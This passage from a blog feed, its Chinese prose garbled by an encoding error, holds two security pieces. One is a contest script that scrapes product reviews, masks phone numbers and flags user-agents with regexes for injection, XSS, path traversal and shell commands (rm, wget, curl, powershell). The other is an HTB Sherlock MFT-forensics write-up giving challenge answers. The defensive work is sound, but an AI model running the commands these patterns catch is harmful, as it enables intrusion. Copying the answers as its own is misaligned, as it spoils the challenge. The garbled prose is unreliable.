class="hljs-number">3</span>åˆ—å†…å®¹çš„submit_3.csvâ½‚ä»¶ã€‚<br>â€¢ ç¬¬â¼€åˆ—ä¸ºuser_idï¼ˆéœ€è¦ä¸åœ¨çº¿å›¢è´­å¹³å°ä¸­â½¤â¼¾è¯„ä»·çš„â½¤â¼¾IDå¯¹åº”ï¼Œä¸¥æ ¼æŒ‰ç…§å‡åºæ’åˆ—ï¼‰<br>â€¢ ç¬¬â¼†åˆ—ä¸ºdesensitizationï¼ˆæ ¹æ®è„±æ•è§„åˆ™å¡«å†™è„±æ•åçš„â¼¿æœºå·ï¼‰<br>â€¢ ç¬¬ä¸‰åˆ—ä¸ºcode_checkï¼ˆæ ¹æ®user_idï¼Œåˆ¤æ–­æ‰€å¯¹åº”çš„ä½¿â½¤è®¾å¤‡å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«æ¶æ„ä»£ç è§„åˆ™æ‰€è¿°å†…<br>å®¹ï¼Œå­˜åœ¨åˆ™ä¸º<span class="hljs-keyword">FALSE</span>ï¼Œä¸å­˜åœ¨æ¶æ„ä»£ç åˆ™ä¸º<span class="hljs-keyword">TRUE</span> ï¼‰<br></code></pre></td></tr></table></figure><p>å’Œä¸Šé¢ä¸¤ä¸ªé€»è¾‘å·®ä¸å¤šï¼Œåªæ˜¯éœ€è¦å¯¹ user-agent è¿›è¡Œæ£€æµ‹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-comment"># é…ç½®æ—¥å¿—</span><br>logging.basicConfig(<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span><br>)<br>logger = logging.getLogger(__name__)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;å®‰å…¨æ£€æµ‹é…ç½®&quot;&quot;&quot;</span><br>    BASE_URL = <span class="hljs-string">&quot;http://47.117.190.214:32800/index.php&quot;</span><br>    PARAMS = &#123;<br>        <span class="hljs-string">&quot;controller&quot;</span>: <span class="hljs-string">&quot;product&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;detail&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-literal">None</span>  <span class="hljs-comment"># åŠ¨æ€å¡«å……å•†å“ID</span><br>    &#125;<br>    REQUEST_TIMEOUT = <span class="hljs-number">20</span><br>    MAX_RETRIES = <span class="hljs-number">3</span><br>    OUTPUT_FILE = <span class="hljs-string">&quot;submit_3.csv&quot;</span><br>    MAX_FAILURES = <span class="hljs-number">10</span>  <span class="hljs-comment"># è¿ç»­å¤±è´¥é˜ˆå€¼</span><br>    HEADERS = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;202.96.128.86&quot;</span><br>    &#125;<br><br><br><span class="hljs-comment"># æ¶æ„ä»£ç æ£€æµ‹è§„åˆ™åº“ï¼ˆå¯åŠ¨æ€æ›´æ–°ï¼‰</span><br>MALICIOUS_PATTERNS = [<br>    <span class="hljs-comment"># SQLæ³¨å…¥æ£€æµ‹</span><br>    (<span class="hljs-string">r&quot;\b(union\s+select|insert\s+into|update\s+\w+\s+set|drop\s+table|&quot;</span><br>     <span class="hljs-string">r&quot;exec(\s|\+)+(s|x)p\w+)&quot;</span>, re.I),<br><br>    <span class="hljs-comment"># XSSæ£€æµ‹</span><br>    (<span class="hljs-string">r&quot;(&lt;script[^&gt;]*&gt;.*?&lt;/script&gt;|javascript:\w+|&quot;</span><br>     <span class="hljs-string">r&quot;on(mouseover|click|load)\s*=\s*[\&quot;&#x27;]?\w+[\&quot;&#x27;]?)&quot;</span>, re.I),<br><br>    <span class="hljs-comment"># å‘½ä»¤æ‰§è¡Œæ£€æµ‹</span><br>    (<span class="hljs-string">r&quot;(;|\||&amp;|`)\s*(rm|wget|curl|ftp|powershell)\b&quot;</span>, re.I),<br><br>    <span class="hljs-comment"># è·¯å¾„éå†æ£€æµ‹</span><br>    (<span class="hljs-string">r&quot;(\.\./\.\./|file:\/\/|\\x[0-9a-f]&#123;2&#125;)&quot;</span>, re.I)<br>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_phone</span>(<span class="hljs-params">raw_phone: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;æ‰‹æœºå·è„±æ•å¤„ç†ï¼ˆå¢å¼ºé²æ£’æ€§ï¼‰&quot;&quot;&quot;</span><br>    clean_phone = re.sub(<span class="hljs-string">r&quot;\D&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, raw_phone)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(clean_phone) != <span class="hljs-number">11</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> clean_phone.startswith((<span class="hljs-string">&#x27;13&#x27;</span>, <span class="hljs-string">&#x27;14&#x27;</span>, <span class="hljs-string">&#x27;15&#x27;</span>, <span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-string">&#x27;17&#x27;</span>, <span class="hljs-string">&#x27;18&#x27;</span>, <span class="hljs-string">&#x27;19&#x27;</span>)):<br>        logger.warning(<span class="hljs-string">f&quot;æ— æ•ˆæ‰‹æœºå·æ ¼å¼: <span class="hljs-subst">&#123;raw_phone&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;INVALID&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;clean_phone[:<span class="hljs-number">3</span>]&#125;</span>****<span class="hljs-subst">&#123;clean_phone[-<span class="hljs-number">4</span>:]&#125;</span>&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect_malicious</span>(<span class="hljs-params">user_agent: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;æ·±åº¦æ¶æ„ä»£ç æ£€æµ‹ï¼ˆæ”¯æŒåŠ¨æ€æ›´æ–°è§„åˆ™ï¼‰&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(<br>        re.search(pattern, user_agent, flags)<br>        <span class="hljs-keyword">for</span> pattern, flags <span class="hljs-keyword">in</span> MALICIOUS_PATTERNS<br>    )<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_user_comments</span>(<span class="hljs-params">html: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;ç²¾å‡†è§£æç”¨æˆ·è¯„è®ºæ•°æ®&quot;&quot;&quot;</span><br>    soup = BeautifulSoup(html, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    users = []<br><br>    <span class="hljs-keyword">for</span> comment <span class="hljs-keyword">in</span> soup.select(<span class="hljs-string">&#x27;div.review-item&#x27;</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># è§£æç”¨æˆ·ID</span><br>            user_id_tag = comment.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-id&#x27;</span>)<br>            user_id = <span class="hljs-built_in">int</span>(re.search(<span class="hljs-string">r&quot;\d+&quot;</span>, user_id_tag.text).group()) <span class="hljs-keyword">if</span> user_id_tag <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>            <span class="hljs-comment"># è§£ææ‰‹æœºå·</span><br>            phone_tag = comment.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;reviewer-phone&#x27;</span>)<br>            raw_phone = re.search(<span class="hljs-string">r&quot;\d&#123;11&#125;&quot;</span>, phone_tag.text).group() <span class="hljs-keyword">if</span> phone_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><br>            <span class="hljs-comment"># è§£æUser-Agent</span><br>            ua_tag = comment.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-agent&#x27;</span>)<br>            user_agent = re.split(<span class="hljs-string">r&quot;[:ï¼š]&quot;</span>, ua_tag.text, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].strip() <span class="hljs-keyword">if</span> ua_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><br>            <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">and</span> raw_phone:<br>                users.append(&#123;<br>                    <span class="hljs-string">&quot;user_id&quot;</span>: user_id,<br>                    <span class="hljs-string">&quot;raw_phone&quot;</span>: raw_phone,<br>                    <span class="hljs-string">&quot;user_agent&quot;</span>: user_agent<br>                &#125;)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.error(<span class="hljs-string">f&quot;è¯„è®ºè§£æå¼‚å¸¸: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> users<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_product_users</span>(<span class="hljs-params">session: requests.Session, product_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;é‡‡é›†å•†å“é¡µå…³è”ç”¨æˆ·æ•°æ®ï¼ˆè‡ªåŠ¨é‡è¯•æœºåˆ¶ï¼‰&quot;&quot;&quot;</span><br>    params = SecurityConfig.PARAMS.copy()<br>    params[<span class="hljs-string">&quot;id&quot;</span>] = product_id<br><br>    <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(SecurityConfig.MAX_RETRIES):<br>        <span class="hljs-keyword">try</span>:<br>            response = session.get(<br>                SecurityConfig.BASE_URL,<br>                params=params,<br>                timeout=SecurityConfig.REQUEST_TIMEOUT<br>            )<br>            response.raise_for_status()<br>            <span class="hljs-keyword">return</span> parse_user_comments(response.text)<br>        <span class="hljs-keyword">except</span> requests.HTTPError <span class="hljs-keyword">as</span> e:<br>            logger.warning(<span class="hljs-string">f&quot;å•†å“ <span class="hljs-subst">&#123;product_id&#125;</span> è¯·æ±‚å¤±è´¥: HTTP <span class="hljs-subst">&#123;e.response.status_code&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> e.response.status_code == <span class="hljs-number">404</span>:<br>                <span class="hljs-keyword">return</span> []<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.warning(<span class="hljs-string">f&quot;å•†å“ <span class="hljs-subst">&#123;product_id&#125;</span> ç¬¬ <span class="hljs-subst">&#123;attempt + <span class="hljs-number">1</span>&#125;</span> æ¬¡å¤±è´¥: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>    logger.error(<span class="hljs-string">f&quot;å•†å“ <span class="hljs-subst">&#123;product_id&#125;</span> æ— æ³•è·å–æ•°æ®&quot;</span>)<br>    <span class="hljs-keyword">return</span> []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">security_processing</span>() -&gt; pd.DataFrame:<br>    <span class="hljs-string">&quot;&quot;&quot;ä¸»å®‰å…¨å¤„ç†æµç¨‹&quot;&quot;&quot;</span><br>    user_records = []<br>    consecutive_failures = <span class="hljs-number">0</span><br>    product_id = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        session.headers.update(SecurityConfig.HEADERS)<br><br>        <span class="hljs-keyword">with</span> tqdm(desc=<span class="hljs-string">&quot;æ‰«æå•†å“&quot;</span>, unit=<span class="hljs-string">&quot;page&quot;</span>) <span class="hljs-keyword">as</span> pbar:<br>            <span class="hljs-keyword">while</span> consecutive_failures &lt; SecurityConfig.MAX_FAILURES:<br>                <span class="hljs-comment"># é‡‡é›†å½“å‰å•†å“ç”¨æˆ·æ•°æ®</span><br>                users = fetch_product_users(session, product_id)<br><br>                <span class="hljs-keyword">if</span> users:<br>                    consecutive_failures = <span class="hljs-number">0</span><br>                    user_records.extend(users)<br>                <span class="hljs-keyword">else</span>:<br>                    consecutive_failures += <span class="hljs-number">1</span><br><br>                <span class="hljs-comment"># æ›´æ–°è¿›åº¦ä¿¡æ¯</span><br>                pbar.update(<span class="hljs-number">1</span>)<br>                pbar.set_postfix(&#123;<br>                    <span class="hljs-string">&quot;å½“å‰å•†å“&quot;</span>: product_id,<br>                    <span class="hljs-string">&quot;æœ‰æ•ˆç”¨æˆ·&quot;</span>: <span class="hljs-built_in">len</span>(user_records),<br>                    <span class="hljs-string">&quot;è¿ç»­å¤±è´¥&quot;</span>: consecutive_failures<br>                &#125;)<br><br>                product_id += <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># æ•°æ®å»é‡ä¸æ ¼å¼è½¬æ¢</span><br>    df = pd.DataFrame(user_records).drop_duplicates(<span class="hljs-string">&#x27;user_id&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> df.empty:<br>        df[<span class="hljs-string">&#x27;desensitization&#x27;</span>] = df[<span class="hljs-string">&#x27;raw_phone&#x27;</span>].apply(desensitize_phone)<br>        df[<span class="hljs-string">&#x27;code_check&#x27;</span>] = df[<span class="hljs-string">&#x27;user_agent&#x27;</span>].apply(<br>            <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">&quot;FALSE&quot;</span> <span class="hljs-keyword">if</span> x <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> detect_malicious(x) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;TRUE&quot;</span><br>        )<br>        <span class="hljs-keyword">return</span> df.sort_values(<span class="hljs-string">&#x27;user_id&#x27;</span>)[[<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;desensitization&#x27;</span>, <span class="hljs-string">&#x27;code_check&#x27;</span>]]<br>    <span class="hljs-keyword">return</span> pd.DataFrame(columns=[<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;desensitization&#x27;</span>, <span class="hljs-string">&#x27;code_check&#x27;</span>])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        result_df = security_processing()<br><br>        <span class="hljs-comment"># æ•°æ®æ ¡éªŒ</span><br>        valid_df = result_df[result_df[<span class="hljs-string">&#x27;desensitization&#x27;</span>] != <span class="hljs-string">&quot;INVALID&quot;</span>]<br>        valid_df.to_csv(SecurityConfig.OUTPUT_FILE, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>        logger.info(<span class="hljs-string">f&quot;ç”Ÿæˆå®‰å…¨æŠ¥å‘ŠæˆåŠŸï¼Œæœ‰æ•ˆç”¨æˆ· <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(valid_df)&#125;</span> ä¸ª&quot;</span>)<br>        logger.info(<span class="hljs-string">f&quot;æ£€æµ‹åˆ°é£é™©è®¾å¤‡ <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(valid_df[valid_df[<span class="hljs-string">&#x27;code_check&#x27;</span>] == <span class="hljs-string">&#x27;FALSE&#x27;</span>])&#125;</span> ä¾‹&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.error(<span class="hljs-string">f&quot;å¤„ç†æµç¨‹å¼‚å¸¸ç»ˆæ­¢: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTB-BFT</title>
    <link href="/2025/03/29/HTB-BFT/"/>
    <url>/2025/03/29/HTB-BFT/</url>
    
    <content type="html"><![CDATA[<p>MFT æ•°æ®å–è¯ï¼Œå¥½å¥½ç©å¥½å¥½ç©ï¼ˆåˆæ˜¯æ–°çŸ¥è¯†å¥½è€¶wwwï¼‰ï¼Levelï¼šVery Easy</p><span id="more"></span><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity. During our analysis, you will utilize the MFTECmd tool to parse the provided MFT file, TimeLine Explorer to open and analyze the results from the parsed MFT, and a Hex editor to recover file contents from the MFT.</p><h1 id="è½¬åŒ–æ ¼å¼"><a href="#è½¬åŒ–æ ¼å¼" class="headerlink" title="è½¬åŒ–æ ¼å¼"></a>è½¬åŒ–æ ¼å¼</h1><p>å…ˆæŠŠ <code>$MFT</code> è½¬åŒ–ä¸º <code>.csv</code> æ–‡ä»¶ï¼Œç”¨ <a href="https://ericzimmerman.github.io/#!index.md">MFTECmd</a> è¿›è¡Œè½¬åŒ–</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">MFTECmd.exe -f &quot;$MFT è·¯å¾„&quot; --csv &quot;Output è·¯å¾„&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/fb55dccf36c9e655.png"></p><p>ç”¨ <a href="https://ericzimmerman.github.io/#!index.md">Timeline Explorer</a> æŸ¥çœ‹ <code>.csv</code> æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/a573e9392fe45636.png"></p><p>æœç´¢ <code>.zip</code> ç­›æŸ¥åˆ° <code>Stage-20240213T093324Z-001.zip</code></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">Task 1<br>Simon Stark was targeted <span class="hljs-keyword">by</span> attackers <span class="hljs-keyword">on</span> February 13. <span class="hljs-keyword">He</span> downloaded a <span class="hljs-keyword">ZIP</span> <span class="hljs-keyword">file</span> from a link received <span class="hljs-keyword">in</span> <span class="hljs-keyword">an</span> email. What was the name of the <span class="hljs-keyword">ZIP</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">he</span> downloaded from the link?<br><br>:Stage-20240213T093324Z-001.<span class="hljs-keyword">zip</span><br></code></pre></td></tr></table></figure><h1 id="æŸ¥æ‰¾-HostUrl"><a href="#æŸ¥æ‰¾-HostUrl" class="headerlink" title="æŸ¥æ‰¾ HostUrl"></a>æŸ¥æ‰¾ HostUrl</h1><p>é‡æ–°åŠ è½½æ‰“å¼€æ–‡ä»¶ï¼Œç„¶åè¿‡æ»¤ <code>.zip</code> æ–‡ä»¶æŸ¥çœ‹ <code>Zone Id Contents</code> åˆ—è¡¨æ‰¾åˆ° HostUrl</p><p><img src="https://img.dkdun.cn/v1/2025/12/3c2401639c88ad23.png"></p><p>HostUrl &#x3D; <a href="https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser">https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Task <span class="hljs-number">2</span><br>Examine <span class="hljs-keyword">the</span> Zone Identifier contents <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> initially downloaded ZIP <span class="hljs-built_in">file</span>. This field reveals <span class="hljs-keyword">the</span> HostUrl <span class="hljs-built_in">from</span> where <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> was downloaded, serving <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> valuable Indicator <span class="hljs-keyword">of</span> Compromise (IOC) <span class="hljs-keyword">in</span> our investigation/analysis. What is <span class="hljs-keyword">the</span> full Host <span class="hljs-built_in">URL</span> <span class="hljs-built_in">from</span> where this ZIP <span class="hljs-built_in">file</span> was downloaded?<br><br>:<span class="hljs-keyword">https</span>://storage.googleapis.com/drive-bulk-export-anonymous/<span class="hljs-number">20240213</span>T093324<span class="hljs-number">.039</span>Z/<span class="hljs-number">4133399871716478688</span>/a40aecd0<span class="hljs-number">-1</span>cf3<span class="hljs-number">-4</span>f88-b55a-e188d5c1c04f/<span class="hljs-number">1</span>/c277a8b4-afa9<span class="hljs-number">-4</span>d34-b8ca-e1eb5e5f983c?authuser<br></code></pre></td></tr></table></figure><h1 id="æŸ¥æ‰¾æ¶æ„æ–‡ä»¶è·¯å¾„å’Œåç§°"><a href="#æŸ¥æ‰¾æ¶æ„æ–‡ä»¶è·¯å¾„å’Œåç§°" class="headerlink" title="æŸ¥æ‰¾æ¶æ„æ–‡ä»¶è·¯å¾„å’Œåç§°"></a>æŸ¥æ‰¾æ¶æ„æ–‡ä»¶è·¯å¾„å’Œåç§°</h1><p>å› ä¸ºå‰é¢å·²ç»æ‰¾åˆ°äº†æ¶æ„å‹ç¼©åŒ…ï¼Œå¹¶ä¸”è¯´æ‰§è¡Œäº†å‹ç¼©åŒ…ï¼Œæ‰€ä»¥è¿™ä¸€æ¬¡å°±å¯ä»¥ç›´æ¥ç­›é€‰åå­—æŸ¥æ‰¾ä¸ <code>Stage-20240213T093324Z-001</code> æœ‰å…³çš„å†…å®¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/7f11a82b2951e1f3.png"></p><p>å¯ä»¥å‘ç° <code>Stage-20240213T093324Z-001\Stage\invoice</code> ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰ä¸ª <code>invoices.zip</code> æ–‡ä»¶ï¼ˆå¥—å¨ƒæ˜¯å§ï¼‰ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶ä¸­åŒ…å«äº†ä¸€ä¸ª  <code>invoice.bat</code> æ–‡ä»¶ï¼Œè¿™å°±æ˜¯éœ€è¦æŸ¥æ‰¾çš„æ¶æ„æ–‡ä»¶ </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Task <span class="hljs-number">3</span><br>What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">full</span> <span class="hljs-type">path</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the malicious file that executed malicious code <span class="hljs-keyword">and</span> connected <span class="hljs-keyword">to</span> a C2 <span class="hljs-keyword">server</span>?<br><br>:C:\Users\simon.stark\Downloads\Stage<span class="hljs-number">-20240213</span>T093324Z<span class="hljs-number">-001</span>\Stage\invoice\invoices\invoice.bat<br></code></pre></td></tr></table></figure><h1 id="è¯†åˆ«æ—¶é—´æˆ³"><a href="#è¯†åˆ«æ—¶é—´æˆ³" class="headerlink" title="è¯†åˆ«æ—¶é—´æˆ³"></a>è¯†åˆ«æ—¶é—´æˆ³</h1><p>çœ‹ <code>Created0x30</code> è¿™æ ç„¶åä¸ <code>invoice.bat</code> å¯¹åº”çš„æ—¶é—´å°±èƒ½æ‰¾åˆ°</p><p><img src="https://img.dkdun.cn/v1/2025/12/689e2729d4f5b20e.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Task <span class="hljs-number">4</span><br>Analyze <span class="hljs-keyword">the</span> $Created0x30 timestamp <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> previously identified <span class="hljs-built_in">file</span>. When was this <span class="hljs-built_in">file</span> created <span class="hljs-keyword">on</span> <span class="hljs-title">disk</span>?<br><br>:<span class="hljs-number">2024</span><span class="hljs-number">-02</span><span class="hljs-number">-13</span> <span class="hljs-number">16</span>:<span class="hljs-number">38</span>:<span class="hljs-number">39</span><br></code></pre></td></tr></table></figure><h1 id="è®¡ç®—-MFT-ä¸­æš‚å­˜æ–‡ä»¶çš„åå…­è¿›åˆ¶åç§»é‡"><a 